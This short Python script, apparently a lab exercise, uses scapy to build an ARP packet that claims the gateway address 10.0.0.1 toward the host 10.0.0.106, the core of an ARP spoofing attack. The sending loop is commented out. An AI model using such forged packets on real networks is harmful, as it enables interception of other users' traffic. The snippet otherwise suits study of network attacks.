from scapy.all import *

myAttack = ARP()
myAttack.show()

myAttack.pdst='10.0.0.106'
myAttack.show()

myAttack.psrc='10.0.0.1'
myAttack.show()

# srloop(myAttack)